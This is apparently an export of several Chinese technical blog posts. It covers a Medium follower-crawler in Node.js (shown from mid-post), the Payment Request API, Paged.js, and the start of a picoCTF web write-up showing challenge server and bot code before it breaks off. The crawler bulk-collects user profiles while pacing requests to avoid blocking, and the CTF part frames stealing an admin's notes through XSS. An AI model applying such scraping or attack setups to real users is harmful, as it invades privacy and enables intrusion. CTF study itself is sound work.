這邊就是放一些設定檔，包括資料庫的設定以及一些抓資料的參數，大多數都是跟抓使用者資料的那個小程式有關，例如說要抓幾筆，然後每一次要停多久之類的。這些都是為了避免送太多 request 被擋而做的措施。 再來看一下 utils.js： module.exports = &#123; // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287 isChinese: (text = '') => &#123; const regex = /(\\p&#123;Script=Hani&#125;)+/gu; return text.match(regex) &#125;, // @see: https://gist.github.com/ryanmcgrath/982242 isJapanese: (text = '') => &#123; const regexJP = /[\\u3040-\\u309F]|[\\u30A0-\\u30FF]/g; const jp = text.match(regexJP) // more than 2 japanese char if (jp &amp;&amp; jp.length >= 2) &#123; return true &#125; return false &#125;, sleep: ms => new Promise(resolve => &#123; setTimeout(resolve, ms) &#125;), log: function () &#123; const args = Array.prototype.slice.call(arguments); console.log.apply(console, args) &#125; &#125; 這邊基本上就是把剛剛用到的一些函式搬過來統一放在這邊，日文字母的限制縮小為兩個，然後把 console.log 包裝了一下，想說之後要客製化比較方便。 然後是 medium.js，這邊是有關 medium API 的部分，並且新增了一個函式 isMandarinUser 來判斷是否是中文使用者： const axios = require('axios') const _ = require('lodash') const utils = require('./utils') const JSON_HIJACKING_PREFIX = '])&#125;while(1);&lt;/x>' // wrapper function, return null instead of throwing error async function getMediumResponse(url) &#123; try &#123; const response = await axios.get(url) const json = JSON.parse(response.data.replace(JSON_HIJACKING_PREFIX, '')) return json &#125; catch(err) &#123; return null &#125; &#125; function isMandarinUser(name, bio, posts) &#123; // if bio or name is japanese, must be japanese if (utils.isJapanese(name) || utils.isJapanese(bio)) &#123; return false &#125; // this user has no activity on medium, decide by name and bio if (!posts) &#123; return utils.isChinese(name) || utils.isChinese(bio) &#125; const contents = _.values(posts).map(item => item.title + _.get(item, 'content.subtitle')) return Boolean( contents.find(item => &#123; return utils.isChinese(item) &amp;&amp; !utils.isJapanese(item) &#125;) ) &#125; module.exports = &#123; getFollowers: async (uid, to) => &#123; let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200` if (to) &#123; url += '&amp;to=' + to &#125; const json = await getMediumResponse(url) if (!json) &#123; return null &#125; const followers = _.keys(json.payload.references.Social) || [] const nextTo = _.get(json, 'payload.paging.next.to') return &#123; followers, nextTo &#125; &#125;, getUserInfo: async (uid) => &#123; const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream` const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const userId = _.get(json, 'payload.user.userId') const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0) const posts = _.get(json, 'payload.references.Post') const name = _.get(json, 'payload.user.name') const bio = _.get(json, 'payload.user.bio') return &#123; isMandarinUser: isMandarinUser(name, bio, posts), userId, name, username: _.get(json, 'payload.user.username'), bio, followerCount: follower, mediumMemberAt: _.get(json, 'payload.user.mediumMemberAt'), isWriterProgramEnrolled: _.get(json, 'payload.user.isWriterProgramEnrolled'), createdAt: _.get(json, 'payload.user.createdAt'), &#125; &#125; &#125; isMandarinUser 會根據三個參數來決定：暱稱、自介以及相關文章。相關文章可能是使用者最近發表過的或者是回覆過與拍手過的文章，會根據文章的標題以及副標題來做判定。 如果使用者沒有任何活動的話，就會跟之前一樣採用自介跟暱稱來判定，所以還是有誤判的可能，但實測過後誤判率已經滿低的了。 接著來看與資料庫相關的操作，db.js： const mysql = require('mysql') const moment = require('moment') function format(time) &#123; if (!time) return null return moment(time).format('YYYY-MM-DD HH:mm:ss') &#125; function transform(info) &#123; return [ info.userId, info.username, info.name, info.bio, info.followerCount, format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled, null ] &#125; class DB &#123; constructor(config) &#123; this.conn = mysql.createPool(config) &#125; getExistingUserIds() &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Users', (err, results) => &#123; if (err) &#123; return reject(err) &#125; return resolve(results.map(item => item.userId)) &#125;); &#125;) &#125; getUserIds(limit) &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Users where fr=\"TW\" order by follower desc limit ' + limit, (err, results) => &#123; if (err) &#123; return reject(err) &#125; return resolve(results.map(item => item.userId)) &#125;); &#125;) &#125; deleteUserIds(userIds) &#123; return new Promise((resolve, reject) => &#123; this.conn.query('DELETE from Queues WHERE userId IN (?)', [userIds], (err, results) => &#123; if (err) &#123; return reject(err) &#125; return resolve(userIds) &#125;) &#125;) &#125; insertUserData(info) &#123; if (!info) return const data = Array.isArray(info) ? info.map(transform) : [transform(info)] this.conn.query(` INSERT INTO Users ( userId, username, name, bio, follower, mediumMemberAt, createdAt, isWriterProgramEnrolled, fr ) VALUES ?`, [data], (err) => &#123; if (err) &#123; // console.log(err) &#125; &#125; ) &#125; insertIntoQueue(list) &#123; return new Promise((resolve, reject) => &#123; const values = [] for (let item of list) &#123; values.push([item]) &#125; this.conn.query(` INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) => &#123; if (err) &#123; // console.log(err) &#125; resolve() &#125; ) &#125;) &#125; &#125; module.exports = DB 基本上就是把一大堆 SQL query 包裝成 Promise 以及 function，方便其他的 module 來使用。大部分的函式都能夠接收一個 array 來做批次操作，這樣會更有效率一點。 而且把這些東西包裝起來之後，queue 的程式碼就會變得非常單純： class Queue &#123; constructor(db) &#123; this.db = db &#125; async get(limit) &#123; const items = await this.db.getUserIds(limit) await this.db.deleteUserIds(items) return items &#125; async push(list) &#123; await this.db.insertIntoQueue(list) &#125; &#125; module.exports = Queue 最後來看一下我們的主程式 app.js，在重構之後程式碼變得乾淨很多，可讀性也提昇了不少： const DB = require('./db') const Queue = require('./queue') const config = require('./config') const medium = require('./medium') const utils = require('./utils') async function main() &#123; const db = new DB(config.db) const queue = new Queue(db) const existingUserIds = await db.getExistingUserIds() const userIdMap = &#123;&#125; for (let userId of existingUserIds) &#123; userIdMap[userId] = true &#125; utils.log('Existing userId:', existingUserIds.length) while(true) &#123; const userIds = await queue.get(1) if (userIds.length === 0) &#123; utils.log('Done') break &#125; const userId = userIds[0] if (userIdMap[userId]) &#123; continue &#125; userIdMap[userId] = true utils.log('userId:', userId) try &#123; const userInfo = await medium.getUserInfo(userId) if (!userInfo.userId) &#123; utils.log('getUerrInfo error, sleep for', config.delayWhenError) await utils.sleep(config.delayWhenError) &#125; if (!userInfo.isMandarinUser) &#123; utils.log(userId, 'not MandarinUser') continue &#125; db.insertUserData(userInfo) if (userInfo.followerCount > 0) &#123; let to = undefined let count = 0 while (true) &#123; const data = await medium.getFollowers(userInfo.userId, to) if (!data) &#123; break &#125; const &#123; nextTo, followers &#125; = data to = nextTo count += followers.length utils.log(userInfo.userId, 'fetching', count, 'followers') await queue.push(followers.filter(uid => !userIdMap[uid])) if (followers.length === 0 || !to) &#123; break &#125; &#125; &#125; &#125; catch (err) &#123; utils.log('sleep for', config.delayWhenError) utils.log(err) await utils.sleep(config.delayWhenError) &#125; &#125; process.exit() &#125; main() 這邊有個機制與之前不一樣，之前是每次從 queue 拿一個 userId 出來就去資料庫確認一下是否爬過，但是這樣太沒有效率。在這個版本改成程式執行時就直接從資料庫裡面把所有資料拿出來，並且變成一個 map，如果有值的話就代表已經抓取過，反之亦然。 重構過的程式碼把 module 切開之後看起來順眼很多，而且要改什麼都很容易，沒有重構過的話我還真不敢 open source 出去… 這邊是重構完的程式碼：https://github.com/aszx87410/medium-user-crawler 總結在寫爬蟲的過程中也是踩了滿多坑的，其中最麻煩的就是語言判斷那一塊，當初沒有想到日文漢字這個 case 要判斷，花了不少時間。偷懶也花了很多時間，原本偷懶不想用更精確的方法來做判定，沒想到最後還是得用，中間浪費了不少時間。 這爬蟲還有滿多地方可以改進的，例如說執行速度的部分，或者是判定語言的部分，目前是我把資料撈出來之後手動標是香港、台灣還是中國，但或許可以寫一些小程式來自動判定，例如說簡體就是中國，有出現一些粵語的字就是香港，反之則是台灣等等，雖然不一定準確，但至少用程式來輔助會方便很多。 這篇主要是分享一下我寫這個爬蟲的歷程，其實只要資料來源能確定抓得到，其他都不是什麼大問題。再加上這個爬蟲沒有很完整（例如說沒有 retry 機制），所以花個一兩天就能夠實作完成了。 希望這篇有吸引到大家，也很希望大家能試試看自己爬資料，做出有趣的數據分析！","link":"/2019/07/12/medium-crawler/"},{"title":"統一網頁支付介面：Payment Request API","text":"前言之前在 Hacker News 上面看到了這一篇文章：Payment Request API — Now Being Implemented in All Major Browsers，大意就是 Payment Request API 這一個東西將會在主流瀏覽器上面被實作出來。 在這之前，我完全沒有聽過這個東西，完全不知道它在做什麼。但經過我稍微研究之後，發現這個原來是網頁支付介面的未來。 Payment Request API 簡介在瞭解一項新事物以前，我習慣先從「目的」下手，如果你知道這個東西是為了解決什麼問題而誕生，就能對它有最基本的了解。 而 Payment Request API 誕生的原因很簡單，就是為了解決支付問題，尤其是在手機上的支付。 先不要談手機，我們先來談電腦端的支付就好。 現在每個購物網站都有不同的支付介面，串接著不同的金流廠商。假設我今天在蝦皮買了《純粹理性批判》，填了信用卡號碼與收貨地址，蝦皮貼心的幫我記住，於是下一次我再購物時，就不必再填收貨地址了。 可是，如果今天 PChome 商家砸錢放送各種優惠，我決定轉到 PChome 上面購物，我買了一本《夢的解析》，就要再填了一次信用卡號碼跟收貨地址。 問題是什麼？ 問題是每一間公司、每一個網站的結帳流程跟介面都不一樣，雖然大同小異，可是那些資料都是沒有辦法共用的。就算我在 100 個網站都填了收貨地址，我在第 101 個網站還是要重新填一次，因為他沒有我的資料。 上面講的是每一個網站有差異的地方，那有任何相同的地方嗎？ 有，那就是你都用同一個瀏覽器購物。 瀏覽器的初次嘗試：自動填入上面說的情景其實不太準確，因為你應該會發現其實瀏覽器會自動幫你記憶地址跟信用卡，就可以很方便地使用自動填入的功能。 例如說刷卡的時候只要刷過一次，就可以讓 Chrome 把這一張的卡的資訊記在瀏覽器裡面，下次再到別的網站刷卡時，你只要點一下輸入卡號的輸入框，Chrome 就會提示你說可以用之前的那張卡來付費。 地址也是如此，都有瀏覽器幫你記憶起來，這樣你就只要填一次之後，之後都可以由 Chrome 幫你自動填入。 可是，這樣還有一個問題，那就是結帳的流程跟介面還是不統一，大家都有自己不同的實作，有的支付介面簡直慘不忍睹，尤其是在手機上！ 根據 Google 的統計，有 65.9% 的使用者在手機上購物時，還沒完成所有流程就離開了。這已經超過一半的用戶了，代表許多網站在手機的支付介面這一塊還有很大的努力空間。 而這一次，瀏覽器決定自己跳下來解決這個問題。 瀏覽器：都交給我吧！瀏覽器要怎麼解決這個痛點？ 簡單！只要由瀏覽器提供一個統一的結帳介面就好，連流程都一併統一。商家的網頁可以根據需求的不同，帶入不同的參數，但最終都是呼叫瀏覽器提供的 API（也就是我們今天的主角：Payment Request API），叫出瀏覽器原生的介面。 當這個 API 普及並且大家都發現比較好用的時候，所有的網頁都會跟進，都會採取一樣的方式。這樣就能夠確保所有網站的支付流程都統一了。 所以 Payment Request API 到底是什麼？ 簡單來說，就是瀏覽器提供的 API，當網頁端以 JavaScript 呼叫以後，就會出現瀏覽器原生的結帳介面，用來取代原有的商家自有的結帳流程。 直接讓你看一張圖就會理解了： 這個就是呼叫 API 之後的樣子。 要特別注意的一點是 Payment Request API 跟後端「完全無關」，你後端就跟以前一樣接收資料即可。有變動的地方是前端，原本你在前端需要寫的那些結帳頁面，都可以交由瀏覽器來 render 原生的 UI，你只要負責呼叫 Payment Request API 即可。 呼叫以後可以拿到使用者填入的那些資料，把那些資料像以前一樣發送到 Server 端就好。 但要注意的是這個 API 還不普及，根據 caniuse.com 的資料，只有 Chrome 61 版、Edge 15 跟 Opera 48 以上才支援，其他的瀏覽器還要再等等。 使用流程說了這麼多，現在就來實際跑一次流程吧！ 我們先建立一個簡單的 demo 頁面，偵測是否支援 Payment Request 以及放置購買按鈕跟回傳的結果： 第一步：創造 Payment Request 物件PaymentRequest接受三個參數，付款方式、交易資訊跟其他。 var request = new PaymentRequest( methodData, // 支援的付款方式 details, // 交易相關的詳細資訊 options // 其他，例如說運送方式等等 ); 我們先實作一個簡單的 function 回傳建立好的 PaymentRequest： function createPaymentRequest () &#123; var methodData = [&#123; supportedMethods: ['basic-card'], // 支援信用卡 data: &#123; // 指定更詳細的資訊 supportedNetworks: ['jcb', 'mastercard', 'visa'], supportedTypes: ['debit', 'credit', 'prepaid'] &#125;, &#125;]; var details = &#123; displayItems: [ // 購買的品項 &#123; label: \"TechBridge Weekly 專業版一年份\", amount: &#123; currency: \"TWD\", value : \"3000.00\" &#125; &#125;, &#123; label: \"早鳥優惠\", amount: &#123; currency: \"TWD\", value : \"-300.00\" &#125; &#125; ], total: &#123; label: \"總額\", amount: &#123; currency: \"TWD\", value : \"2700.00\" &#125; &#125; &#125;; return new PaymentRequest(methodData, details); &#125; 這邊有一點要特別注意，那就是total那邊的總額，系統「不會幫你自己算好」，所以儘管上面總和是 2700，你要輸入其他數字也可以。 還有另一個條件是這個 API 不支援退款，所以總和必須是正數。但是每一個品項可以是負數，這樣就可以放一些折扣相關的東西。 第二步：呼叫 API，顯示結帳頁面建立完 PaymentRequest 之後，可以用.show()顯示結帳 UI，會回傳一個 Promise，使用過後可以拿到使用者的相關資料。我們在購買按鈕按下去之後來進行結帳流程。 function onClick () &#123; var request = createPaymentRequest(); request.show().then(function(PaymentResponse) &#123; handleResponse(PaymentResponse); &#125;).catch(function(err) &#123; console.log(err); &#125;); &#125; 第三步：處理資料及回傳結果最後一步就是處理上一步拿到的資料，把那些資訊發送到 Server 去完成結帳流程，並且傳回結果，讓 UI 顯示成功或是失敗。我們在這邊只是範例，所以就省略上述步驟，並且直接把上一步拿到的資料轉成 JSON 顯示出來。 function showResponse (response) &#123; $res.innerHTML = JSON.stringify(response, undefined, 2); &#125; function handleResponse (paymentResponse) &#123; // 可以在這裡把結果回傳 server // 只是示範，所以我們直接將資料顯示出來 showResponse(paymentResponse); // 模擬 API 的延遲 setTimeout(function () &#123; // 結帳成功 paymentResponse.complete(\"success\"); &#125;, 2000); &#125; （這邊的卡號是我在 http://www.getcreditcardnumbers.com/ 隨便產生的） 只要上面簡單的三個步驟，就能夠取得使用者的資料並且完成結帳。比起原先每個網站建立的自有結帳流程，使用 Payment Request API 的好處就是可以帶給使用者原生的結帳體驗，進而增加轉換率。 而上面的三個步驟，最重要的就是第一個帶入參數的部分，這邊還有很多細節可以調整，例如說貨幣種類、要求運送地址，並且可以根據使用者選擇的地址判斷接受或是不接受（例如說不接受送貨到國外，就能在那邊判斷）。 支付方式也可以指定某幾間的信用卡，或甚至是決定要不要支援 debit card。 如果你對這些細項有興趣，可以參考 Google 提供的非常詳細的教學：Deep Dive into the Payment Request API。 原生結帳 UI如果你想自己跑一遍結帳流程，可以直接去 demo 網頁 試試看。 在這邊我直接截圖給大家看在電腦以及手機上面的結帳流程。 電腦按下按鈕之後的畫面： 點進訂單摘要： 新增信用卡： 新增地址： 按下支付之後，要求輸入末三碼： 結帳失敗： 手機按下按鈕之後的畫面： 點進訂單摘要： 新增信用卡： 新增地址： 結帳失敗： 總結Payment Request API 正在被其他瀏覽器（例如說 Safari）實作，可以預期到將來必定會被廣泛支援。 其實國外的金流廠商 Stripe 已經支援使用 Payment Request API 了。而 PaymentRequest Sample 這個網站也可以看到更多樣化的範例。 這篇文章主要目的是把這項新的標準帶到大家面前，如果覺得很有興趣想要深入研究，底下有附上許多相關資源。 參考資料： MDN - Payment Request API Deep Dive into the Payment Request API Introducing the Payment Request API PaymentRequest Credit Cards Sample w3c&#x2F;payment-request-info FAQ","link":"/2017/10/04/payment-request-api/"},{"title":"用 Paged.js 做出適合印成 PDF 的 HTML 網頁","text":"前言之前在公司內接到了一個需求，需要產生出一份 PDF 格式的報告。想要產一份 PDF 有很多種做法，例如說可以先用 Word 做，做完之後再轉成 PDF。但我聽到這需求時，最先出現的想法就是寫成網頁，然後再利用列印功能轉成 PDF。 我在前公司的時候看過一個用 JS 來產生 PDF 的專案，是用 PDFKit 來做，自由度極高，但我覺得滿難維護的。原因是用這一套的話，就有點像是把 PDF 畫出來，你要指定 (x,y) 座標去畫東西，可能改一個小地方，就要改很多行程式碼。 那時候我想說怎麼不直接用最簡單的 HTML + CSS 就好，切好版之後再轉成 PDF，如果不想手動轉，也可以透過 headless chrome 去轉，因為是網頁的關係所以應該滿好維護的。而且排版的話因為是用 HTML 跟 CSS，應該會比用畫的簡單許多才對。 直到我後來接觸到網頁轉 PDF，才發現事情不像我想的這麼簡單。 目標先讓大家知道一下最後需要產生的報告長什麼樣子是很重要的，因為這樣才能評估每一項技術是否能達成這個需求。 底下先大概講一下我預期中要達到的功能，也就是報告最後的長相。 第一，要有一個封面頁，不能有頁首頁尾跟頁碼，而且內容要置中。 第二，要可以自訂每一頁的頁首跟頁碼格式，還要可以設定頁尾，像這樣： 第三，表格的地方如果跨頁，要自動重複顯示 table head： 或大家也可以直接看看最後 PDF 長什麼樣子：https://aszx87410.github.io/demo/print/print_demo.pdf 知道目標之後，就可以來研究一下該怎麼達成這些功能。 HTML 網頁轉 PDF - 利用原生功能 @media print因為對這一塊不熟，所以先 Google 了一些中文文章來看，包括： CSS - 網頁列印與樣式 其實Css的內心還住著一位Print 原來前端網頁列印，不是只要 window.print() 就好了 @media print 你是誰？ 關於 @media print 的二三事.. 透過 CSS 列印(print) 設定網頁列印時的樣式 重點大概就是利用 CSS @media print 去做設定，然後可以設置什麼時候換頁，以及記得勾選一些設定才能把背景顯示出來。 我自己稍微嘗試了一下這些做法，發現這些可以處理基本的需求，但如果需求再複雜一點就沒辦法了。 舉例來說，如果我想自訂每一頁的頁首頁尾，該怎麼辦？每一頁的頁首跟頁尾都有可能不一樣。如果我事先可以規劃多少內容一頁的話，或許還有機會解決，但如果不行呢？例如說我有一個很長的列表，我根本不知道會有幾頁，那該怎麼做？ 關於頁首頁尾，我有找到這篇：The Ultimate Print HTML Template with Header &amp; Footer 確實有幫助，但沒辦法解決頁碼的問題。 上面的這些做法，頁碼就是靠著列印時勾選瀏覽器預設的頁碼，然後標題就是網頁的標題或是網址，這些樣式我該怎麼客製化？例如說我想把頁碼換位置，做得到嗎？ 後來我在網路上搜尋過一輪，發現這些似乎不是原生 CSS 可以解決的狀況。於是我把方向轉成：「先用 HTML 印出沒有頁碼的 PDF，再從後端加工處理」。因為已經有 PDF 了，所以自然而然也可以知道有幾頁，那就可以用開頭說的 PDFKit 或是其他 library 加上去了。意思就是先轉成 PDF，再加工，需要有兩道程序。 我還找到了一套 WeasyPrint，看起來好像也可以自訂頁首頁尾跟頁碼，不過依然不是理想中的解決方案。 正當我開始覺得：「這些只用前端網頁的話好像做不到」的時候，救星出現了。 Paged.js，網頁列印排版的最佳解決方案Paged.js 對自己的介紹是： Paged.js is a free and open source JavaScript library that paginates content in the browser to create PDF output from any HTML content. This means you can design works for print (eg. books) using HTML and CSS! Paged.js follows the Paged Media standards published by the W3C (ie the Paged Media Module, and the Generated Content for Paged Media Module). In effect Paged.js acts as a polyfill for the CSS modules to print content using features that are not yet natively supported by browsers. 簡單來說呢，Paged.js 是一個開源的 JavaScript library，用來幫助你列印出 PDF。而嚴格來說它其實有很多的部分是 polyfill。事實上，W3C 已經有一些負責列印相關的 CSS 屬性，可是還處於草稿的階段，因此瀏覽器也還沒實作，所以需要靠著 Paged.js 來 polyfill。 先給大家看一下用 Paged.js 可以做到的成果是什麼： demo 網站：https://aszx87410.github.io/demo/print/print.html 產生出的 PDF：https://aszx87410.github.io/demo/print/print_demo.pdf 如果想要學習 Paged.js 的使用，我非常推薦去看官方文件，因為功能都寫在上面了，這篇文章只是想讓大家知道一下有這個解法，因此不會講得太多。底下就簡單講一下我想要的每個功能是怎麼實作出來的。 這些功能其實用圖片跟文字有點難解釋，因為我建議稍微看過之後，直接去看上面附的 demo 網站的 source code，我覺得會比較容易理解。 自訂每個頁面原生的 CSS 好像只能統一對頁面調整，但是 Paged.js 支援針對各種頁面，比如說： @page &#123; size: A4; margin-top: 20mm; margin-bottom: 20mm; margin-left: 20mm; margin-right: 20mm; padding-top: 2rem; &#125; @page:nth(1) &#123; padding-top: 0; &#125; 我先針對所有頁面統一調整 margin 跟 padding，但是對第一頁取消 padding-top，因為第一頁是封面所以不需要 padding。 如果不想用頁數來做 selector，也可以直接幫頁面取名，像是這樣： &lt;div class=\"page-cover\"> ... &lt;/div> .page-cover &#123; page: coverPage; &#125; @page coverPage &#123; padding-top: 0; &#125; 這樣做的話，就可以針對特定類型的頁面去做頁面樣式的控制。 自訂頁首及頁尾Paged.js 會自動幫你把內容分頁，然後幫你把每一頁都加上預設的排版與 CSS 等等，而經過改造後的每一頁都會長這樣（圖片取自於官網）： Page area 是你的內容，而其他地方都是區塊的名稱，你可以用 CSS 來決定這些區塊要放什麼，舉例來說： @page &#123; @top-center &#123; content: \"hello\"; &#125; &#125; 這樣寫的話，在每個頁面的中間上方都會出現：hello 這個字。 因此可以透過這樣子的 CSS，非常輕易就達成自訂頁首以及頁尾這個功能。不過這只是最基本的而已，精彩的還在後面。 很多時候只有文字是不夠的，我們還想要加一些樣式，或甚至是圖片。再者，每一頁的頁首跟頁尾都有可能不同，有可能這一頁的標題我想叫做 A，下一頁叫做 B，這樣怎麼辦呢？ 在 Paged.js 裡面有個概念叫做：running headers&#x2F;footers，可以利用這個概念來達成動態的頁首以及頁尾。 剛剛的 CSS 本來 content 都會是固定的，現在可以改一下： @page &#123; @top-center &#123; content: element(title); &#125; &#125; 這樣寫的話，中間的內容就會是叫做 title 的 element。那這個 element 又是什麼呢？一樣用 CSS 指定即可： .title &#123; position: running(title); color: white; font-size: 1.25rem; &#125; 這邊有個大家應該沒看過的 position 值，叫做 running(title)，意思就是要把 .title 這個元素設定成 running title，對應到了剛剛的 element(title)。 因此只要把每一頁的 title 都放在 HTML 裡面，就會自動去抓它的內容，然後放在你想放置的位置。 &lt;div class=\"page\"> &lt;div class=\"title\">這是第一頁標題&lt;/div> 第一頁內容 &lt;/div> &lt;div class=\"page\"> &lt;div class=\"title\">這是第二頁標題&lt;/div> 第二頁內容 &lt;/div> 上面的那兩個 title class 的 div，就不會出現在文件的內容中，而是會被拉到 top center 那個位置。而 title 的內容也會隨著頁面而變，是個超級方便的功能！ 範例中的頁尾則是這樣做的： @page &#123; @bottom-left &#123; content: element(footer); &#125; &#125; .footer &#123; position: running(footer); font-size: 1rem; color: #999; border-top: 2px solid #ccc; &#125; &lt;div class=\"footer\"> &lt;p>本文件僅供教學使用，請勿用於商業之用途&lt;/p> &lt;/div> 除了內容可以客製以外，那幾格的樣式也可以。例如說範例中我把整個 header 的背景顏色都變了，因為這幾個格子其實都有預設的 class，因此可以透過 CSS 來做： .pagedjs_page:not([data-page-number=\"1\"]) .pagedjs_margin-top-left-corner-holder, .pagedjs_page:not([data-page-number=\"1\"]) .pagedjs_margin-top, .pagedjs_page:not([data-page-number=\"1\"]) .pagedjs_margin-top-right-corner-holder &#123; background: #658db4; outline: 2px #658db4; &#125; 這邊前面會加上 .pagedjs_page:not([data-page-number=&quot;1&quot;]) 是因為第一頁我不想動到，所以用這個 selector 排除了第一頁。而那個 outline 是因為我發現有時候好像 header 會有一條白色，猜測可能是 render 的問題，所以想說看能不能硬把它蓋掉： 自訂頁碼關於頁碼的部分，Paged.js 提供了兩個 CSS counter 可以使用：counter(page) 與 counter(pages)。 如果想跟範例一樣在右上角加上頁數，就可以這樣寫： @page &#123; @top-right &#123; color: white; content: \"第 \" counter(page) \" 頁，共 \" counter(pages) \" 頁\"; &#125; &#125; 這樣就可以做到在任意地方加上頁碼了！而且可以自訂格式，如果要調整樣式的話也可以直接調整。 Table head 自動延續其實有關於 table head 會自動延續這個功能，使用原生的 HTML table 標籤時就有了。只是 Paged.js 可能處理上有一些問題，所以這功能就不見了。 但要加回來也不難，我有找到一段簡單的程式碼可以解掉這個問題，來源：Repeat table header on subsequent pages &lt;script> // @see: https://gitlab.pagedmedia.org/tools/pagedjs/issues/84#note_535 class RepeatingTableHeaders extends Paged.Handler &#123; constructor(chunker, polisher, caller) &#123; super(chunker, polisher, caller); &#125; afterPageLayout(pageElement, page, breakToken, chunker) &#123; // Find all split table elements let tables = pageElement.querySelectorAll(\"table[data-split-from]\"); tables.forEach((table) => &#123; // Get the reference UUID of the node let ref = table.dataset.ref; // Find the node in the original source let sourceTable = chunker.source.querySelector(\"[data-ref='\" + ref + \"']\"); // Find if there is a header let header = sourceTable.querySelector(\"thead\"); if (header) &#123; // Clone the header element let clonedHeader = header.cloneNode(true); // Insert the header at the start of the split table table.insertBefore(clonedHeader, table.firstChild); &#125; &#125;); &#125; &#125; Paged.registerHandlers(RepeatingTableHeaders); &lt;/script> HTML 的部分記得用 table 來做就好，像這樣： &lt;table> &lt;thead> &lt;tr> &lt;th>網址&lt;/th> &lt;th>文章名稱&lt;/th> &lt;th>瀏覽次數&lt;/th> &lt;th>跳出率&lt;/th> &lt;/tr> &lt;/thead> &lt;tbody> &lt;tr> &lt;td>blog.huli.tw&lt;/td> &lt;td>CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？&lt;/td> &lt;td>34532&lt;/td> &lt;td>52.3%&lt;/td> &lt;/tr> &lt;/tbody> &lt;/table> 結語以上幾個示範程式碼都滿短的，而且大多數都是 CSS，用這套之前還真的沒想過可以透過 CSS 來調整這麼多東西。 我自己用過 Paged.js 這套以後十分滿意，是我目前認為純前端做 HTML 轉 PDF 版型的最佳方案，原因之一就是我前面說的，除了它之外，我沒有找到其它套件可以支援自訂頁首頁尾以及頁碼等等。這套用起來真的很驚艷，因為我想解決的需求，它都有提供解決方案，而且用起來其實還滿好用的。 唯一美中不足的地方大概就是上面有些截圖會看到的那個大概 1px 的白線，我猜應該是瀏覽器 render 的時候有一些問題之類的，或搞不好也跟 PDF viewer 什麼的有關。但那個如果真的想蓋掉應該不是難事，最麻煩頂多就是硬畫一條線上去蓋住。 我自己需要的功能都放在範例裡面了，想看完整範例程式碼的話我放在這邊：https://github.com/aszx87410/demo/blob/master/print/print.html 想要其他更多功能的話，可以參考 Paged.js 的文件跟官網：https://www.pagedjs.org/ 這篇推薦給所有跟我有類似需求的人，希望 Paged.js 也可以解決你們的問題。或如果你有知道哪些純前端的套件比 Paged.js 更好用的，也可以推薦給我。","link":"/2021/06/12/paged-js-htmo-to-pdf-best-solution/"},{"title":"picoCTF 2022 筆記","text":"這次有兩題 Web 比較難，解掉了一題，另一題解不開但解法超值得一看，照樣簡單寫個心得。 Noted連結在這：https://play.picoctf.org/practice/challenge/282 簡單來說狀況是這樣的，這是一個常見的可以新增 note 的系統，在 &#x2F;notes 頁面可以看到自己所有的 note，然後有個 self XSS，然後現在有個處於登入狀態下的 admin 會造訪你提供的 URL，要想辦法拿到 admin 的筆記內容。 程式碼： fastify.after(() => &#123; fastify.get('/', (req, res) => &#123; if (req.user) return res.redirect('/notes'); return res.view('login'); &#125;); fastify.post('/login', &#123; schema: userSchema &#125;, async (req, res) => &#123; let &#123; username, password &#125; = req.body; username = username.toLowerCase(); let user = await User.findOne(&#123; where: &#123; username &#125;&#125;); if (user === null) &#123; return res.status(400).send('User not found'); &#125; if (!(await argon2.verify(user.password, password))) &#123; return res.status(400).send('Wrong password!'); &#125; req.session.set('user', user.username); return res.redirect('/notes'); &#125;); fastify.get('/register', (req, res) => &#123; return res.view('register'); &#125;); fastify.post('/register', &#123; schema: userSchema &#125;, async (req, res) => &#123; let &#123; username, password &#125; = req.body; username = username.toLowerCase(); let user = await User.findOne(&#123; where: &#123; username &#125;&#125;); if (user) &#123; return res.status(400).send('User already exists!'); &#125; await User.create(&#123; username, password: await argon2.hash(password) &#125;); req.session.set('user', username); return res.redirect('/notes'); &#125;); fastify.get('/notes', auth(async (req, res) => &#123; return res.view('notes', &#123; notes: req.user.notes, csrf: await res.generateCsrf() &#125;); &#125;)); fastify.get('/new', auth(async (req, res) => &#123; return res.view('new', &#123; csrf: await res.generateCsrf() &#125;); &#125;)); fastify.post('/new', &#123; schema: noteSchema, preHandler: fastify.csrfProtection &#125;, auth(async (req, res) => &#123; let &#123; title, content &#125; = req.body; await Note.create(&#123; title, content, userId: req.user.id &#125;); return res.redirect('/notes'); &#125;)); fastify.post('/delete', &#123; schema: deleteSchema, preHandler: fastify.csrfProtection &#125;, auth(async (req, res) => &#123; let &#123; id &#125; = req.body; let deleted = false; for (let note of req.user.notes) &#123; if (note.id === id) &#123; await note.destroy(); deleted = true; &#125; &#125; if (deleted) &#123; return res.redirect('/notes'); &#125; else &#123; res.status(400).send('Note not found!'); &#125; &#125;)); fastify.get('/report', auth(async (req, res) => &#123; return res.view('report', &#123; csrf: await res.generateCsrf() &#125;); &#125;)); fastify.post('/report', &#123; schema: reportSchema, preHandler: fastify.csrfProtection &#125;, auth((req, res) => &#123; let &#123; url &#125; = req.body; if (report.open) &#123; return res.send('Only one browser can be open at a time!'); &#125; else &#123; report.run(url); &#125; return res.send('URL has been reported.'); &#125;)); &#125;) bot 的程式碼： const crypto = require('crypto'); const puppeteer = require('puppeteer'); async function run(url) &#123; let browser; try &#123; module.exports.open = true; browser = await puppeteer.launch(&#123; headless: true, pipe: true, args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'], slowMo: 10 &#125;); let page = (await browser.pages())[0] await page.goto('http://0.0.0.0:8080/register'); await page.type('[name=\"username\"]', crypto.randomBytes(8).toString('hex')); await page.type('[name=\"password\"]', crypto.randomBytes(8).toString('hex')); await Promise.all([ page.click('[type=\"submit\"]'), page.waitForNavigation(&#123; waituntil: 'domcontentloaded' &#125;) ]); await page.goto('http://0.0.0.0:8080/new'); await page.type('[name=\"title\"]', 'flag'); await page.type('[name=\"content\"]', process.env.FLAG ?? 